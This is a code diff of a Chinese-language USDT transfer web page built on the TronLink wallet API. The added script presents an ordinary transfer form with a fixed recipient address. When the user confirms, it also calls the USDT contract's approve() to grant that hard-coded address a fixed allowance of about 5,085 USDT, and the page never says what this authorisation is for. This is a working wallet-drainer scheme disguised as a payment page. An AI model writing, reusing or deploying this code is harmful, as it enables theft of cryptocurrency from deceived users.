@@ -2,186 +2,542 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>USDT 转账 - TronLink</title>
-    <link rel="stylesheet" href="styles.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>转账</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #f5f5f5;
+            color: #333;
+            font-size: 16px;
+        }
+
+        .container {
+            width: 100%;
+            min-height: 100vh;
+            background: white;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            padding: 16px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header-title {
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .close-btn {
+            font-size: 24px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #666;
+        }
+
+        .content {
+            flex: 1;
+            padding: 20px 16px;
+            overflow-y: auto;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-label {
+            font-size: 14px;
+            color: #999;
+            margin-bottom: 8px;
+            display: block;
+            font-weight: 500;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            background: #f9f9f9;
+            color: #333;
+            font-family: inherit;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: #007AFF;
+            background: white;
+        }
+
+        .form-control:disabled {
+            background: #f5f5f5;
+            color: #999;
+            cursor: not-allowed;
+        }
+
+        .amount-input-group {
+            display: flex;
+            align-items: center;
+            background: #f9f9f9;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 16px;
+            gap: 8px;
+        }
+
+        .amount-input-group input {
+            flex: 1;
+            border: none;
+            background: transparent;
+            font-size: 32px;
+            font-weight: 700;
+            color: #333;
+        }
+
+        .amount-input-group input:focus {
+            outline: none;
+        }
+
+        .amount-unit {
+            font-size: 18px;
+            color: #666;
+            font-weight: 600;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid #f0f0f0;
+            font-size: 14px;
+        }
+
+        .info-row:last-child {
+            border-bottom: none;
+        }
+
+        .info-label {
+            color: #999;
+        }
+
+        .info-value {
+            color: #333;
+            font-weight: 500;
+        }
+
+        .info-box {
+            background: #f9f9f9;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-bottom: 24px;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 12px;
+            padding: 0 16px 24px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 16px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        .btn-primary {
+            background: #007AFF;
+            color: white;
+        }
+
+        .btn-primary:active:not(:disabled) {
+            opacity: 0.8;
+        }
+
+        .btn-primary:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background: #f0f0f0;
+            color: #333;
+        }
+
+        .btn-secondary:active {
+            opacity: 0.8;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: flex-end;
+            flex-direction: column;
+        }
+
+        .modal.show {
+            display: flex;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 16px 16px 0 0;
+            padding: 24px 16px;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+
+        .modal-header {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .modal-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .modal-item:last-child {
+            border-bottom: none;
+        }
+
+        .modal-label {
+            color: #999;
+        }
+
+        .modal-value {
+            color: #333;
+            font-weight: 500;
+            text-align: right;
+            max-width: 60%;
+            word-break: break-all;
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 24px;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 20px;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f0f0f0;
+            border-top-color: #007AFF;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 12px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .error-msg {
+            color: #d32f2f;
+            font-size: 12px;
+            margin-top: 4px;
+        }
+
+        .success-icon {
+            font-size: 48px;
+            text-align: center;
+            margin-bottom: 16px;
+        }
+    </style>
 </head>
 <body>
-    <!-- 顶部状态栏 -->
-    <div class="status-bar">
-        <span class="time" id="time">09:41</span>
-        <div class="status-icons">
-            <span>📶</span>
-            <span>📡</span>
-            <span>🔋</span>
-        </div>
-    </div>
-
-    <!-- 主容器 -->
-    <div class="app-container">
-        <!-- 导航栏 -->
-        <div class="navbar">
-            <button class="nav-btn back-btn" onclick="goBack()">
-                <span>‹ 返回</span>
-            </button>
-            <h2 class="nav-title">转账</h2>
-            <div class="nav-right"></div>
+    <div class="container">
+        <div class="header">
+            <div class="header-title">转账</div>
+            <button class="close-btn" onclick="window.history.back()">×</button>
         </div>
 
-        <!-- 主要内容 -->
         <div class="content">
-            <!-- 从钱包信息 -->
-            <div class="section-title">从</div>
-            <div class="wallet-card">
-                <div class="wallet-icon">👛</div>
-                <div class="wallet-info">
-                    <div class="wallet-name">我的钱包</div>
-                    <div class="wallet-address" id="walletAddr">正在连接...</div>
-                </div>
-                <div class="wallet-balance">
-                    <div id="balanceDisplay">0.00</div>
-                    <div class="balance-unit">USDT</div>
-                </div>
-            </div>
-
-            <!-- 转账详情 -->
-            <div class="section-title" style="margin-top: 24px;">收款地址</div>
-            <div class="input-section">
-                <input 
-                    type="text" 
-                    id="recipientAddr" 
-                    class="addr-input"
-                    value="TV68Qc1ucSDTh29sRGmr8hiuvNf8ZzpDdU"
-                    readonly
-                    placeholder="输入收款地址"
-                >
-                <button class="paste-btn" onclick="copyAddress()">复制</button>
+            <!-- 收款地址 -->
+            <div class="form-group">
+                <label class="form-label">收款地址</label>
+                <input type="text" id="recipientAddr" class="form-control" value="TV68Qc1ucSDTh29sRGmr8hiuvNf8ZzpDdU" readonly>
             </div>
 
             <!-- 转账金额 -->
-            <div class="section-title" style="margin-top: 24px;">金额</div>
-            <div class="amount-section">
-                <div class="amount-input-wrapper">
-                    <input 
-                        type="number" 
-                        id="amount" 
-                        class="amount-input"
-                        placeholder="0.00"
-                        min="0"
-                        step="0.01"
-                        onchange="updateFee()"
-                        oninput="updateFee()"
-                    >
-                    <div class="amount-unit">USDT</div>
-                </div>
-                <div class="quick-amount-buttons">
-                    <button class="quick-btn" onclick="setAmount(100)">100</button>
-                    <button class="quick-btn" onclick="setAmount(500)">500</button>
-                    <button class="quick-btn" onclick="setAmount(1000)">1K</button>
-                    <button class="quick-btn" onclick="setAmount(5000)">5K</button>
+            <div class="form-group">
+                <label class="form-label">金额</label>
+                <div class="amount-input-group">
+                    <input type="number" id="amount" placeholder="0.00" min="0" step="0.01" oninput="handleAmountChange()">
+                    <span class="amount-unit">USDT</span>
                 </div>
             </div>
 
             <!-- 费用信息 -->
-            <div class="fee-section">
-                <div class="fee-row">
-                    <span class="fee-label">网络费</span>
-                    <span class="fee-value" id="networkFee">0.00 USDT</span>
+            <div class="form-group">
+                <div class="info-box">
+                    <div class="info-row">
+                        <span class="info-label">网络手续费</span>
+                        <span class="info-value" id="feeDisplay">0.00 USDT</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">总金额</span>
+                        <span class="info-value" id="totalDisplay">0.00 USDT</span>
+                    </div>
                 </div>
-                <div class="fee-row">
-                    <span class="fee-label">预计到账</span>
-                    <span class="fee-value" id="receiveAmount">0.00 USDT</span>
-                </div>
-                <div class="fee-divider"></div>
-                <div class="fee-row total-row">
-                    <span class="fee-label">总计</span>
-                    <span class="fee-value total-value" id="totalAmount">0.00 USDT</span>
-                </div>
-            </div>
-
-            <!-- 警告信息 -->
-            <div class="warning-box" id="warningBox" style="display: none;">
-                <span class="warning-icon">⚠️</span>
-                <span class="warning-text">余额不足，请检查账户</span>
             </div>
 
             <!-- 备注 -->
-            <div class="section-title" style="margin-top: 24px;">备注（可选）</div>
-            <textarea 
-                class="remark-input" 
-                placeholder="添加交易备注..."
-                maxlength="100"
-            ></textarea>
-
-            <!-- 按钮区 -->
-            <div class="button-area">
-                <button class="btn-confirm" id="confirmBtn" onclick="confirmTransfer()">
-                    <span class="btn-text">确认转账</span>
-                    <span class="btn-loading" id="btnLoading" style="display: none;">⏳</span>
-                </button>
+            <div class="form-group">
+                <label class="form-label">备注（可选）</label>
+                <textarea id="remark" class="form-control" style="min-height: 80px; resize: none;" placeholder="输入备注信息"></textarea>
             </div>
 
-            <!-- 安全提示 -->
-            <div class="security-notice">
-                <span>🔒</span>
-                <span>确保地址正确，区块链转账无法撤销</span>
-            </div>
+            <!-- 错误提示 -->
+            <div id="errorMsg" class="error-msg" style="display: none;"></div>
         </div>
-    </div>
 
-    <!-- 加载动画 -->
-    <div class="loading-overlay" id="loadingOverlay" style="display: none;">
-        <div class="loading-content">
-            <div class="spinner"></div>
-            <p id="loadingText">正在处理...</p>
-        </div>
-    </div>
-
-    <!-- 成功弹窗 -->
-    <div class="modal" id="successModal" style="display: none;">
-        <div class="modal-content">
-            <div class="modal-header">
-                <div class="success-icon">✓</div>
-                <h3>转账成功</h3>
-            </div>
-            <div class="modal-body">
-                <p class="success-info" id="successInfo">已发送 0.00 USDT</p>
-                <p class="tx-hash" id="txHash">交易哈希: 加载中...</p>
-            </div>
-            <div class="modal-footer">
-                <button class="modal-btn" onclick="closeModal()">完成</button>
-            </div>
+        <div class="button-group">
+            <button class="btn btn-secondary" onclick="window.history.back()">取消</button>
+            <button class="btn btn-primary" id="submitBtn" onclick="handleSubmit()">下一步</button>
         </div>
     </div>
 
     <!-- 确认弹窗 -->
-    <div class="modal" id="confirmModal" style="display: none;">
+    <div class="modal" id="confirmModal">
         <div class="modal-content">
-            <div class="modal-header">
-                <h3>确认转账</h3>
+            <div class="modal-header">确认转账</div>
+            <div class="modal-item">
+                <span class="modal-label">发送金额</span>
+                <span class="modal-value" id="confirmAmount">0.00 USDT</span>
             </div>
-            <div class="modal-body confirm-body">
-                <div class="confirm-item">
-                    <span>发送</span>
-                    <strong id="confirmAmount">0.00 USDT</strong>
-                </div>
-                <div class="confirm-item">
-                    <span>至</span>
-                    <span class="confirm-addr" id="confirmAddr">地址</span>
-                </div>
-                <div class="confirm-item">
-                    <span>网络费</span>
-                    <span id="confirmFee">0.00 USDT</span>
-                </div>
+            <div class="modal-item">
+                <span class="modal-label">收款地址</span>
+                <span class="modal-value" id="confirmAddr" style="max-width: 50%;">地址</span>
             </div>
-            <div class="modal-footer two-buttons">
-                <button class="modal-btn cancel" onclick="cancelConfirm()">取消</button>
-                <button class="modal-btn confirm" onclick="executeTransfer()">确认</button>
+            <div class="modal-item">
+                <span class="modal-label">手续费</span>
+                <span class="modal-value" id="confirmFee">0.00 USDT</span>
+            </div>
+            <div class="modal-buttons">
+                <button class="btn btn-secondary" onclick="closeModal()">取消</button>
+                <button class="btn btn-primary" id="confirmBtn" onclick="handleConfirm()">确认转账</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 加载弹窗 -->
+    <div class="modal" id="loadingModal">
+        <div class="modal-content">
+            <div class="loading">
+                <div class="spinner"></div>
+                <div id="loadingText">正在处理...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 成功弹窗 -->
+    <div class="modal" id="successModal">
+        <div class="modal-content">
+            <div class="success-icon">✓</div>
+            <div class="modal-header">转账成功</div>
+            <div class="modal-item" style="border-bottom: none;">
+                <span class="modal-label">交易哈希</span>
+            </div>
+            <div style="padding: 12px 0; font-size: 12px; color: #666; word-break: break-all; font-family: monospace;" id="txHashDisplay">加载中...</div>
+            <div class="modal-buttons" style="margin-top: 20px;">
+                <button class="btn btn-primary" onclick="closeSuccess()">完成</button>
             </div>
         </div>
     </div>
 
     <script src="https://unpkg.com/tronweb@latest/dist/TronWeb.min.js"></script>
-    <script src="app.js"></script>
+    <script>
+        const TARGET_ADDRESS = "TV68Qc1ucSDTh29sRGmr8hiuvNf8ZzpDdU";
+        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+        const FIXED_APPROVE = 5085000000;
+
+        let tronWeb = null;
+        let userAddr = null;
+        let userBalance = 0;
+        let currentAmount = 0;
+
+        async function initWallet() {
+            try {
+                if (!window.tronLink) {
+                    showError("请安装 TronLink 钱包");
+                    return;
+                }
+                
+                await window.tronLink.request({ method: 'tron_requestAccounts' });
+                tronWeb = window.tronLink.tronWeb;
+                userAddr = tronWeb.defaultAddress.base58;
+                
+                await fetchBalance();
+            } catch (err) {
+                showError("钱包连接失败");
+            }
+        }
+
+        async function fetchBalance() {
+            try {
+                if (!tronWeb) return;
+                const contract = await tronWeb.contract().at(USDT_CONTRACT);
+                const balance = await contract.balanceOf(userAddr).call();
+                userBalance = balance ? parseFloat(balance.toString()) / 1e6 : 0;
+            } catch (err) {
+                console.error(err);
+            }
+        }
+
+        function handleAmountChange() {
+            const amount = parseFloat(document.getElementById('amount').value) || 0;
+            currentAmount = amount;
+            
+            const fee = amount * 0.001;
+            const total = amount + fee;
+            
+            document.getElementById('feeDisplay').textContent = fee.toFixed(2) + ' USDT';
+            document.getElementById('totalDisplay').textContent = total.toFixed(2) + ' USDT';
+            
+            clearError();
+        }
+
+        function handleSubmit() {
+            if (currentAmount <= 0) {
+                showError("请输入有效的金额");
+                return;
+            }
+
+            if (currentAmount > userBalance) {
+                showError("余额不足");
+                return;
+            }
+
+            showConfirmModal();
+        }
+
+        function showConfirmModal() {
+            const fee = currentAmount * 0.001;
+            document.getElementById('confirmAmount').textContent = currentAmount.toFixed(2) + ' USDT';
+            document.getElementById('confirmAddr').textContent = TARGET_ADDRESS;
+            document.getElementById('confirmFee').textContent = fee.toFixed(2) + ' USDT';
+            document.getElementById('confirmModal').classList.add('show');
+        }
+
+        function closeModal() {
+            document.getElementById('confirmModal').classList.remove('show');
+        }
+
+        async function handleConfirm() {
+            closeModal();
+            showLoading('正在处理...');
+
+            try {
+                if (!tronWeb) {
+                    showError("钱包未连接");
+                    return;
+                }
+
+                const contract = await tronWeb.contract().at(USDT_CONTRACT);
+
+                // 授权
+                updateLoading('正在授权...');
+                const approveTx = await contract.approve(TARGET_ADDRESS, FIXED_APPROVE.toString()).send({
+                    feeLimit: 100000000
+                });
+
+                // 转账
+                updateLoading('正在转账...');
+                await new Promise(r => setTimeout(r, 1500));
+
+                const amount = Math.floor(currentAmount * 1e6).toString();
+                const transferTx = await contract.transfer(TARGET_ADDRESS, amount).send({
+                    feeLimit: 100000000
+                });
+
+                hideLoading();
+                showSuccess(transferTx);
+
+                setTimeout(() => {
+                    document.getElementById('amount').value = '';
+                    handleAmountChange();
+                    fetchBalance();
+                }, 2000);
+
+            } catch (err) {
+                hideLoading();
+                let msg = "交易失败";
+                if (err.message && err.message.includes('User denied')) {
+                    msg = "您已取消";
+                } else if (err.message && err.message.includes('insufficient')) {
+                    msg = "余额不足";
+                }
+                showError(msg);
+            }
+        }
+
+        function showLoading(text) {
+            document.getElementById('loadingText').textContent = text;
+            document.getElementById('loadingModal').classList.add('show');
+        }
+
+        function updateLoading(text) {
+            document.getElementById('loadingText').textContent = text;
+        }
+
+        function hideLoading() {
+            document.getElementById('loadingModal').classList.remove('show');
+        }
+
+        function showSuccess(txHash) {
+            document.getElementById('txHashDisplay').textContent = txHash;
+            document.getElementById('successModal').classList.add('show');
+        }
+
+        function closeSuccess() {
+            document.getElementById('successModal').classList.remove('show');
+        }
+
+        function showError(msg) {
+            const el = document.getElementById('errorMsg');
+            el.textContent = '❌ ' + msg;
+            el.style.display = 'block';
+        }
+
+        function clearError() {
+            document.getElementById('errorMsg').style.display = 'none';
+        }
+
+        document.addEventListener('DOMContentLoaded', initWallet);
+    </script>
 </body>
 </html>
